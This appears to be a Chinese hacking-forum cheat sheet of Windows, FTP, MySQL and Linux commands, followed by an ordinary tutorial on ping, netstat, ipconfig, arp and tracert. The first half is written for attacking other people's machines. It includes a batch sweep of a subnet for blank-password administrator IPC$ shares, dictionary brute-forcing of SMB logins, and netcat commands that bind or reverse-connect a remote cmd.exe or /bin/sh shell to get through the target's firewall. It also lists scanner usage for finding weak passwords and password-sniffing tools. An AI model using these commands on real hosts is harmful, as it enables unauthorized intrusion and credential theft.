tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 
exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe 
path 路径可执行文件的文件名 为可执行文件设置一个路径。 
cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /? 
regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； 
regedit /e 注册表文件名 导出注册表 
cacls 文件名 参数 显示或修改文件访问控制列表（ACL）--针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户 
名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更 
改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。 
cacls 文件名 查看文件的访问用户权限列表 
REM 文本内容 在批处理文件中添加注解 
netsh 查看或更改本地网络配置情况 

四： 


IIS服务命令： 
iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） 
iisreset /start或stop 启动（停止）所有Internet服务 
iisreset /restart 停止然后重新启动所有Internet服务 
iisreset /status 显示所有Internet服务状态 
iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 
iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 
iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 
iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将 
会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。 
FTP 命令： (后面有详细说明内容) 
ftp的命令行格式为: 
ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。 
－d 使用调试方式。 
－n 限制ftp的自动登录,即不使用.netrc文件。 
－g 取消全局文件名。 
help [命令] 或 ？[命令] 查看命令说明 
bye 或 quit 终止主机FTP进程,并退出FTP管理方式. 
pwd 列出当前远端主机目录 
put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中 
get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中 
mget [remote-files] 从远端主机接收一批文件至本地主机 
mput local-files 将本地主机中一批文件传送至远端主机 
dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本 
地文件 
ascii 设定以ASCII方式传送文件(缺省值) 
bin 或 image 设定以二进制方式传送文件 
bell 每完成一次文件传送,报警提示 
cdup 返回上一级目录 
close 中断与远程服务器的ftp会话(与open对应) 
open host[port] 建立指定ftp服务器连接,可指定连接端口 
delete 删除远端主机中的文件 
mdelete [remote-files] 删除一批文件 
mkdir directory-name 在远端主机中建立目录 
rename [from] [to] 改变远端主机中的文件名 
rmdir directory-name 删除远端主机中的目录 
status 显示当前FTP的状态 
system 显示远端主机系统类型 
user user-name [password] [account] 重新以别的用户名登录远端主机 
open host [port] 重新建立一个新的连接 
prompt 交互提示模式 
macdef 定义宏命令 
lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录 
chmod 改变远端主机的文件权限 
case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母 
cd remote－dir 进入远程主机目录 
cdup 进入远程主机目录的父目录 
! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip 


#5 五： 


MYSQL 命令： 
mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。 
（例：mysql -h110.110.110.110 -Uroot -P123456 
注:u与root可以不用加空格，其它也一样） 
exit 退出MYSQL 
mysqladmin -u用户名 -p旧密码 password 新密码 修改密码 
grant select on 数据库.* to 用户名@登录主机 identified by "密码"; 增加新用户。（注意：和上面不同，下 
面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符） 
show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我 
们改密码和新增用户，实际上就是用这个库进行操作。 
use mysql； 
show tables; 显示库中的数据表 
describe 表名; 显示数据表的结构 
create database 库名; 建库 
use 库名； 
create table 表名 (字段设定列表)； 建表 
drop database 库名; 
drop table 表名； 删库和删表 
delete from 表名; 将表中记录清空 
select * from 表名; 显示表中的记录 
mysqldump --opt school>school.bbb 备份数据库：（命令在DOS的mysql in目录下执行）;注释:将数据库 
school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。 
win2003系统下新增命令（实用部份）： 
shutdown /参数 关闭或重启本地或远程主机。 
参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主 
机。 
例：shutdown /r /t 0 立即重启本地主机（无延时） 
taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。 
参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终 
止指定的进程及他所启动的子进程。 
tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 
参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。 
六： 
Linux系统下基本命令： 要区分大小写 
uname 显示版本信息（同win2K的 ver） 
dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir） 
pwd 查询当前所在的目录位置 
cd cd ..回到上一层目录，注意cd 与..之间有空格。cd /返回到根目录。 
cat 文件名 查看文件内容 
cat >abc.txt 往abc.txt文件中写上内容。 
more 文件名 以一页一页的方式显示一个文本文件。 
cp 复制文件 
mv 移动文件 
rm 文件名 删除文件，rm -a 目录名删除目录及子目录 
mkdir 目录名 建立目录 
rmdir 删除子目录，目录内没有文档。 
chmod 设定档案或目录的存取权限 
grep 在档案中查找字符串 
diff 档案文件比较 
find 档案搜寻 
date 现在的日期、时间 
who 查询目前和你使用同一台机器的人以及Login时间地点 
w 查询目前上机者的详细资料 
whoami 查看自己的帐号名称 
groups 查看某人的Group 
passwd 更改密码 
history 查看自己下过的命令 
ps 显示进程状态 
kill 停止某进程 
gcc 黑客通常用它来编译C语言写的文件 
su 权限转换为指定使用者 
telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。 
ftp ftp连接上某服务器（同win2K） 


附：批处理命令与变量 


1：for命令及变量 基本格式： 
FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定 
一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。 
批处理每次能处理的变量从%0-%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2-%9指输入的 
第2-9个值；例：net use ipipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3 


(set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),{ "(1 1 
254)"第一个"1"指起始值，第二个"1"指增长量，第三个"254"指结束值，即：从1到254；"(1 -1 254)"说明：即从254到 
1 } 


command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：& 来隔开 
command_parameters：为特定命令指定参数或命令行开关 


IN (set)：指在(set)中取值；DO command ：指执行command 


参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如 
(d:pass.txt)时 }。 
用法举例： 
@echo off 
echo 用法格式：test.bat *.*.* > test.txt 


for /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use \%1.%%G / 
user:administrator | find "命令成功完成" >>test.txt 
存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存 
在test.txt中。 


/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；& 用来 
隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有"命令成功完成"信息；%1.%%G 为完整的 
IP地址；(1 1 254) 指起始值，增长量，结止值。 
@echo off 
echo 用法格式：ok.bat ip 
FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200 
存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为 
用户名；%1为输入的IP地址（默认）。 
七： 
2：if命令及变量 基本格式： 
IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为"真"。 
例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行 
最后返回的值不等于1，就执行后面的命令。 
0 指发现并成功执行（真）；1 指没有发现、没执行（假）。 
IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。 
例："if "%2%"=="4" goto start"指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加" 
"） 
IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。 
例："if not nc.exe goto end"指：如果没有发现nc.exe文件就跳到":end"标签处。 
IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令 
语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else 
后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用< >括起来，因为del命令要单独一行时才 
能执行，用上< >后就等于是单独一行了；例如："if exist test.txt. <del test.txt.> else echo 
test.txt.missing "，注意命令中的"." 


（二）系统外部命令(均需下载相关工具)： 


1、瑞士军刀：nc.exe 


参数说明： 
-h 查看帮助信息 
-d 后台模式 
-e prog程序重定向，一但连接就执行〔危险〕 
-i secs延时的间隔 
-l 监听模式，用于入站连接 
-L 监听模式，连接天闭后仍然继续监听，直到CTR+C 
-n IP地址，不能用域名 
-o film记录16进制的传输 
-p[空格]端口 本地端口号 
-r 随机本地及远程端口 
-t 使用Telnet交互方式 
-u UDP模式 
-v 详细输出，用-vv将更详细 
-w数字 timeout延时间隔 
-z 将输入，输出关掉（用于扫锚时） 
基本用法： 
nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口 
nc -l -p 80 开启本机的TCP 80端口并监听 
nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口 
nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的 
TCP 5354端口 
nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向 
连接192.168.0.2的5354端口 
高级用法： 
nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 
nc -L -p 80 > c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:log.txt 
nc -L -p 80 < c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把 
c:honeyport.txt中内容送入管道中，亦可起到传送文件作用 
type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把 
c:honeyport.txt中内容送入管道中,亦可起到传送文件作用 
本机上用：nc -l -p 本机端口 
在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K 
nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙 
本机上用：nc -d -l -p 本机端口 < 要传送的文件路径及名称 
在对方主机上用：nc -vv 本机IP 本机端口 > 存放文件的路径及名称 传送文件到对方主机 
备 注： 
| 管道命令 
< 或 > 重定向命令。"<"，例如：tlntadmn < test.txt 指把test.txt的内容赋值给tlntadmn命令 
＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:winnt >> d:log.txt 意思是：后台执行dir，并把结果 
存在d:log.txt中 


>与>>的区别 ">"指：覆盖；">>"指：保存到(添加到）。 


如：@dir c:winnt >> d:log.txt和@dir c:winnt > d:log.txt二个命令分别执行二次比较看：用>>的则 
是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。 

八： 


2、扫锚工具：xscan.exe 


基本格式 
xscan -host <起始IP>[-<终止IP>] <检测项目> [其他选项] 扫锚"起始IP到终止IP"段的所有主机信息 
xscan -file <主机列表文件名> <检测项目> [其他选项] 扫锚"主机IP列表文件名"中的所有主机信息 
检测项目 
-active 检测主机是否存活 
-os 检测远程操作系统类型（通过NETBIOS和SNMP协议） 
-port 检测常用服务的端口状态 
-ftp 检测FTP弱口令 
-pub 检测FTP服务匿名用户写权限 
-pop3 检测POP3-Server弱口令 
-smtp 检测SMTP-Server漏洞 
-sql 检测SQL-Server弱口令 
-smb 检测NT-Server弱口令 
-iis 检测IIS编码/解码漏洞 
-cgi 检测CGI漏洞 
-nasl 加载Nessus攻击脚本 
-all 检测以上所有项目 
其它选项 
-i 适配器编号 设置网络适配器, <适配器编号>可通过"-l"参数获取 
-l 显示所有网络适配器 
-v 显示详细扫描进度 
-p 跳过没有响应的主机 
-o 跳过没有检测到开放端口的主机 
-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10 
-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件) 
用法示例 
xscan -host 192.168.1.1-192.168.255.255 -all -active -p 检测 
192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机 
xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测 
192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端 
口的主机 
xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测"hostlist.txt"文件中列 
出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机 


九： 


3、命令行方式嗅探器: xsniff.exe 
可捕获局域网内FTP/SMTP/POP3/HTTP协议密码 
参数说明 
-tcp 输出TCP数据报 
-udp 输出UDP数据报 
-icmp 输出ICMP数据报 
-pass 过滤密码信息 
-hide 后台运行 
-host 解析主机名 
-addr IP地址 过滤IP地址 
-port 端口 过滤端口 
-log 文件名 将输出保存到文件 
-asc 以ASCII形式输出 
-hex 以16进制形式输出 
用法示例 
xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中 
xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以 
ASCII格式输出 


4、终端服务密码破解: tscrack.exe 


参数说明 
-h 显示使用帮助

http://groups.google.com/group/mise5
 


局域网常用的DOS网络命令 

 
一、Ping命令的使用技巧 

　　Ping是个使用频率极高的实用程序，用于确定本地主机是否能与另一台主机交换（发送与接收）数据报。根据返回的信息，我们就可以推断TCP/IP参数是否设置得正确以及运行是否正常。需要注意的是：成功地与另一台主机进行一次或两次数 据报交换并不表示TCP/IP配置就是正确的，我们必须执行大量的本地主机与远程主机的数据报交换，才能确信TCP/IP的正确性。 

　　简单的说，Ping就是一个测试程序，如果Ping运行正确，我们大体上就可以排除网络访问层、网卡、MODEM的输入输出线路、电缆和路由器等存在的故障，从而减小了问题的范围。但由于可以自定义所发数据报的大小及无休止的高速发送，Ping也被某些别有用心的人作为DDOS（拒绝服务攻击）的工具，例如许多大型的网站就是被黑客利用数百台可以高速接入互联网的电脑连续发送大量Ping数据报而瘫痪的。 

　　按照缺省设置，Windows上运行的Ping命令发送4个ICMP（网间控制报文协议）回送请求，每个32字节数据，如果一切正常，我们应能得到4个回送应答。 Ping能够以毫秒为单位显示发送回送请求到返回回送应答之间的时间量。如果应答时间短，表示数据报不必通过太多的路由器或网络连接速度比较快。Ping还能显示TTL（Time To Live存在时间）值，我们可以通过TTL值推算一下数据包已经通过了多少个路由器：源地点TTL起始值（就是比返回TTL略大的一个2的乘方数）-返回时TTL值。例如，返回TTL值为119，那么可以推算数据报离开源地址的TTL起始值为128，而源地点到目标地点要通过9个路由器网段（128-119）；如果返回TTL值为246，TTL起始值就是256，源地点到目标地点要通过9个路由器网段。 

　　1、通过Ping检测网络故障的典型次序 

正常情况下，当我们使用Ping命令来查找问题所在或检验网络运行情况时，我们需要使用许多Ping命令，如果所有都运行正确，我们就可以相信基本的连通性和配置参数没有问题；如果某些Ping命令出现运行故障，它也可以指明到何处去查找问题。下面就给出一个典型的检测次序及对应的可能故障： 

　　·ping 127.0.0.1 

这个Ping命令被送到本地计算机的IP软件，该命令永不退出该计算机。如果没有做到这一点，就表示TCP/IP的安装或运行存在某些最基本的问题。 

　　·ping 本机IP 

　　这个命令被送到我们计算机所配置的IP地址，我们的计算机始终都应该对该Ping命令作出应答，如果没有，则表示本地配置或安装存在问题。出现此问题时，局域网用户请断开网络电缆，然后重新发送该命令。如果网线断开后本命令正确，则表示另一台计算机可能配置了相同的IP地址。 

　　·ping 局域网内其他IP 

这个命令应该离开我们的计算机，经过网卡及网络电缆到达其他计算机，再返回。收到回送应答表明本地网络中的网卡和载体运行正确。但如果收到0个回送应答，那么表示子网掩码（进行子网分割时，将IP地址的网络部分与主机部分分开的代码）不正确或网卡配置错误或电缆系统有问题。 
·ping 网关IP 

　　这个命令如果应答正确，表示局域网中的网关路由器正在运行并能够作出应答。 

　　·ping 远程IP 

如果收到4个应答，表示成功的使用了缺省网关。对于拨号上网用户则表示能够成功的访问Internet（但不排除ISP的DNS会有问题）。 

　　·ping localhost 
localhost是个作系统的网络保留名，它是127.0.0.1的别名，每太计算机都应该能够将该名字转换成该地址。如果没有做到这一带内，则表示主机文件（/Windows/host）中存在问题。 

　　·ping www.xxx.com 
对这个域名执行Ping www.xxx.com 地址，通常是通过DNS 服务器 如果这里出现故障，则表示DNS服务器的IP地址配置不正确或DNS服务器有故障（对于拨号上网用户，某些ISP已经不需要设置DNS服务器了）。顺便说一句：我们也可以利用该命令实现域名对IP地址的转换功能。如果上面所列出的所有Ping命令都能正常运行，那么我们对自己的计算机进行本地和远程通信的功能基本上就可以放心了。但是，这些命令的成功并不表示我们所有的网络配置都没有问题，例如，某些子网掩码错误就可能无法用这些方法检测到。 

　　2、Ping命令的常用参数选项 

　　·ping IP Ct 

连续对IP地址执行Ping命令，直到被用户以Ctrl+C中断。 

　　·ping IP -l 3000 

指定Ping命令中的数据长度为3000字节，而不是缺省的32字节。 

　　·ping IP Cn 

执行特定次数的Ping命令。 

　　二、Netstat 命令的使用技巧 

　　Netstat用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。如果我们的计算机有时候接受到的数据报会导致出错数据删除或故障，我们不必感到奇怪，TCP/IP可以容许这些类型的错误，并能够自动重发数据报。但如果累计的出错情况数目占到所接收的IP数据报相当大的百分比，或者它的数目正迅速增加，那么我们就应该使用Netstat查一查为什么会出现这些情况了。 

　1、netstat 的一些常用选项 

　　·netstat Cs 

　　本选项能够按照各个协议分别显示其统计数据。如果我们的应用程序（如Web浏览器）运行速度比较慢，或者不能显示Web页之类的数据，那么我们就可以用本选项来查看一下所显示的信息。我们需要仔细查看统计数据的各行，找到出错的关键字，进而确定问题所在。 

　　·netstat Ce 

　　本选项用于显示关于以太网的统计数据。它列出的项目包括传送的数据报的总字节数、错误数、删除数、数据报的数量和广播的数量。这些统计数据既有发送的数据报数量，也有接收的数据报数量。这个选项可以用来统计一些基本的网络流量）。 

　　·netstat Cr 

　　本选项可以显示关于路由表的信息，类似于后面所讲使用route print命令时看到的 信息。除了显示有效路由外，还显示当前有效的连接。 

　　·netstat Ca 

　　本选项显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED），也包括监听连接请求（LISTENING）的那些连接。 

　　·netstat Cn 

　　显示所有已建立的有效连接。 

下面是 netstat 的输出示例： 

　　C:\>netstat -e 
　　Interface Statistics 
　　Received　　　Sent 
　　Bytes　　　　　　　　　3995837940　　47224622 
　　Unicast packets　　　　120099　　　　131015 
　　Non-unicast packets　　7579544　　　 3823 
　　Discards　　　　　　　 0　　　　　　 0 
　　Errors　　　　　　　　 0　　　　　　 0 
　　Unknown protocols　　　363054211 
　C:\>netstat -a 
　　Active Connections 
　　Proto Local Address　　　Foreign Address　　　 State 
　　TCP　CORP1:1572　　　 172.16.48.10:nbsession　 ESTABLISHED 
　　TCP　CORP1:1589　　　 172.16.48.10:nbsession　 ESTABLISHED 
　　TCP　CORP1:1606　　　 172.16.105.245:nbsession ESTABLISHED 
　　TCP　CORP1:1632　　　 172.16.48.213:nbsession　ESTABLISHED 
　　TCP　CORP1:1659　　　 172.16.48.169:nbsession　ESTABLISHED 
　　TCP　CORP1:1714　　　 172.16.48.203:nbsession　ESTABLISHED 
　　TCP　CORP1:1719　　　 172.16.48.36:nbsession　 ESTABLISHED 
　　TCP　CORP1:1241　　　 172.16.48.101:nbsession　ESTABLISHED 
　　UDP　CORP1:1025　　　 *:* 
　　UDP　CORP1:snmp　　　 *:* 
　　UDP　CORP1:nbname　　 *:* 
　　UDP　CORP1:nbdatagram *:* 
　　UDP　CORP1:nbname　　 *:* 
　　UDP　CORP1:nbdatagram *:* 

　　C:\>netstat -s 
　　IP Statistics 
　　Packets Received　　　　　　 = 5378528 
　　Received Header Errors　　　 = 738854 
　　Received Address Errors　　　= 23150 
　　Datagrams Forwarded　　　　　= 0 
　　Unknown Protocols Received　 = 0 
　　Received Packets Discarded　 = 0 
　　Received Packets Delivered　 = 4616524 
　　Output Requests　　　　　　　= 132702 
　　Routing Discards　　　　　　 = 157 
　　Discarded Output Packets　　 = 0 
　　Output Packet No Route　　　 = 0 
　　Reassembly Required　　　　　= 0 
　　Reassembly Successful　　　　　　 = 0 
　　Reassembly Failures　　　　　　　 = 
　　Datagrams Successfully Fragmented = 0 
　　Datagrams Failing Fragmentation　 = 0 
　　Fragments Created　　　　　　　　 = 0 
ICMP Statistics 
　　Received　Sent 
　　Messages　　　　　　　　 693　　　 4 
　　Errors　　　　　　　　　 0　　　　 0 
　　Destination Unreachable　685　　　 0 
　　Time Exceeded　　　　　　0　　　　 0 
　　Parameter Problems　　　 0　　　　 0 
　　Source Quenches　　　　　0　　　　 0 
　　Redirects　　　　　　　　0　　　　 0 
　　Echoes　　　　　　　　　 4　　　　 0 
　　Echo Replies　　　　　　 0　　　　 4 
　　Timestamps　　　　　　　 0　　　　 0 
　　Timestamp Replies　　　　0　　　　 0 
　　Address Masks　　　　　　0　　　　 0 
　　Address Mask Replies　　 0　　　　 0 

　　TCP Statistics 
　　Active Opens　　　　　　　　 = 597 
　　Passive Opens　　　　　　　　= 135 
　　Failed Connection Attempts　 = 107 
　　Reset Connections　　　　　　= 91 
　　Current Connections　　　　　= 8 
　　Segments Received　　　　　　= 106770 
　　Segments Sent　　　　　　　　= 118431 
　　Segments Retransmitted　　　 = 461 

　　UDP Statistics 
　　Datagrams Received　 = 4157136 
　　No Ports　　　　　　 = 351928 
　　Receive　Errors　　　 = 2 
　　Datagrams Sent　　　 = 13809 

　　2、Netstat的妙用 
　　经常上网的人一般都使用ICQ的，不知道我们有没有被一些讨厌的人骚扰，想投诉却又不知从和下手？其实，我们只要知道对方的IP，就可以向他所属的ISP投诉了。但怎样才能通过ICQ知道对方的IP呢？如果对方在设置ICQ时选择了不显示IP地址，那我们是无法在信息栏中看到的。其实，我们只需要通过Netstat就可以很方便的做到这一点：当他通过ICQ或其他的工具与我们相连时（例如我们给他发一条ICQ信息或他给我们发一条信息），我们立刻在DOS 命令提示符下输入netstat -n或netstat -a就可以看到对方上网时所用的IP或ISP域名了，甚至连所用Port都完全暴露了。 

　　三、IPConfig命令的使用技巧 

　　IPConfig实用程序和它的等价图形用户界面----Windows 95/98中的WinIPCfg可用于显示当前的TCP/IP配置的设置值。这些信息一般用来检验人工配置的TCP/IP设置是否正确。但是，如果我们的计算机和所在的局域网使用了动态主机配置协议（DHCP），这个程序所显示的信息也许更加实用。这时，IPConfig可以让我们了解自己的计算机是否成功的租用到一个IP地址，如果租用到则可以了解它目前分配到的是什么地址。了解计算机当前的IP地址、子网掩码和缺省网关实际上是进行测试和故障分析的必要项目。 
　1、IPConfig最常用的选项 

　　·ipconfig 

当使用IPConfig时不带任何参数选项，那么它为每个已经配置了的接口显示IP地址、子网掩码和缺省网关值。 

　　·ipconfig /all 

当使用all选项时，IPConfig能为DNS和WINS服务器显示它已配置且所要使用的附加信息（如IP地址等），并且显示内置于本地网卡中的物理地址（MAC）。如果IP地址是从DHCP服务器租用的，IPConfig将显示DHCP服务器的IP地址和租用地址预计失效的日期。 

　　·ipconfig /release和ipconfig /renew 

　　这是两个附加选项，只能在向DHCP服务器租用其IP地址的计算机上起作用。如果我们输入ipconfig /release，那么所有接口的租用IP地址便重新交付给DHCP服务器（归还IP地址）。如果我们输入ipconfig /renew，那么本地计算机便设法与DHCP服务器取得联系，并租用一个IP地址。请注意，大多数情况下网卡将被重新赋予和以前所赋予的相同的IP地址。下面的范例是 ipconfig /all 命令输出，该计算机配置成使用 DHCP 服务器动态配置 TCP/IP，并使用 WINS 和 DNS 服务器解析名称。 

　　Windows 2000 IP Configuration 
　　Node Type.. . . . . . . . : Hybrid 
　　IP Routing Enabled.. . . . : No 
　　WINS Proxy Enabled.. . . . : No 
　　Ethernet adapter Local Area Connection: 
　　Host Name.. . . . . . . . : corp1.microsoft.com 
　　DNS Servers . . . . . . . : 10.1.0.200 
　　Description. . . . . . . : 3Com 3C90x Ethernet Adapter 
　　Physical Address. . . . . : 00-60-08-3E-46-07 
　　DHCP Enabled.. . . . . . . : Yes 
　　Autoconfiguration Enabled.: Yes 
　　IP Address. . . . . . . . . : 192.168.0.112 
　　Subnet Mask. . . . . . . . : 255.255.0.0 
　　Default Gateway. . . . . . : 192.168.0.1 
　　DHCP Server. . . . . . . . : 10.1.0.50 
　　Primary WINS Server. . . . : 10.1.0.101 
　　Secondary WINS Server. . . : 10.1.0.102 
　　Lease Obtained.. . . . . . : Wednesday, September 02, 1998 10:32:13 AM 
　　Lease Expires.. . . . . . : Friday, September 18, 1998 10:32:13 AM 　 

　　如果我们使用的是Windows 95/98，那么我们应该更习惯使用winipcfg而不是ipconfig，因为它是一个图形用户界面，而且所显示的信息与ipconfig相同，并且也提供发布和更新动态IP地址的选项。 
四、ARP（地址转换协议）的使用技巧 

　　ARP是一个重要的TCP/IP协议，并且用于确定对应IP地址的网卡物理地址。实用arp命令，我们能够查看本地计算机或另一台计算机的ARP高速缓存中的当前内容。此外，使用arp命令，也可以用人工方式输入静态的网卡物理/IP地址对，我们可能会使用这种方式为缺省网关和本地服务器等常用主机进行这项作，有助于减少网络上的信息量。 

　　按照缺省设置，ARP高速缓存中的项目是动态的，每当发送一个指定地点的数据报且高速缓存中不存在当前项目时，ARP便会自动添加该项目。一旦高速缓存的项目被输入，它们就已经开始走向失效状态。例如，在Windows NT/2000网络中，如果输入项目后不进一步使用，物理/IP地址对就会在2至10分钟内失效。因此，如果ARP高速缓存中项目很少或根本没有时，请不要奇怪，通过另一台计算机或路由器的ping命令即可添加。所以，需要通过arp命令查看高速缓存中的内容时，请最好先ping 此台计算机（不能是本机发送ping命令）。 

　　ARP常用命令选项： 

　　·arp -a或arp Cg 

　　用于查看高速缓存中的所有项目。-a和-g参数的结果是一样的，多年来-g一直是UNIX平台上用来显示ARP高速缓存中所有项目的选项，而Windows用的是arp -a（-a可被视为all，即全部的意思），但它也可以接受比较传统的-g选项。 

　　·arp -a IP 

　　如果我们有多个网卡，那么使用arp -a加上接口的IP地址，就可以只显示与该接口相关的ARP缓存项目。 

　　·arp -s IP 物理地址 

　　我们可以向ARP高速缓存中人工输入一个静态项目。该项目在计算机引导过程中将保持有效状态，或者在出现错误时，人工配置的物理地址将自动更新该项目。 

　　·arp -d IP 

　　使用本命令能够人工删除一个静态项目。 

　　例如我们在命令提示符下，键入 Arp Ca；如果我们使用过 Ping 命令测试并验证从这台计算机到 IP 地址为 10.0.0.99 的主机的连通性，则 ARP 缓存显示以下项： 

　　Interface:10.0.0.1 on interface 0x1 
　　Internet Address　　　Physical Address　　　Type 
　　10.0.0.99　　　　　　 00-e0-98-00-7c-dc　　 dynamic 
在此例中，缓存项指出位于 10.0.0.99 的远程主机解析成 00-e0-98-00-7c-dc 的媒体访问控制地址，它是在远程计算机的网卡硬件中分配的。媒体访问控制地址是计算机用于与网络上远程 TCP/IP 主机物理通讯的地址。至此我们可以用ipconfig和ping命令来查看自己的网络配置并判断是否正确、可以用netstat查看别人与我们所建立的连接并找出ICQ使用者所隐藏的IP信息、可以用arp查看网卡的MAC地址。 

　　五、Tracert、Route 与BTStat的使用技巧 

　　1、Tracert的使用技巧　　 

　　如果有网络连通性问题，可以使用 tracert 命令来检查到达的目标 IP 地址的路径并记录结果。tracert 命令显示用于将数据包从计算机传递到目标位置的一组 IP 路由器，以及每个跃点所需的时间。如果数据包不能传递到目标，tracert 命令将显示成功转发数据包的最后一个路由器。当数据报从我们的计算机经过多个网关传送到目的地时，Tracert命令可以用来跟踪数据报使用的路由（路径）。该实用程序跟踪的路径是源计算机到目的地的一条路径，不能保证或认为数据报总遵循这个路径。如果我们的配置使用DNS，那么我们常常会从所产生的应答中得到城市、地址和常见通信公司的名字。Tracert是一个运行得比较慢的命令（如果我们指定的目标地址比较远），每个路由器我们大约需要给它15秒钟。 

　 Tracert的使用很简单，只需要在tracert后面跟一个IP地址或URL，Tracert会进行相应的域名转换的。 

　　tracert 最常见的用法： 

　　tracert IP address [-d] 该命令返回到达 IP 地址所经过的路由器列表。通过使用 -d 选项，将更快地显示路由器路径，因为 tracert 不会尝试解析路径中路由器的名称。 

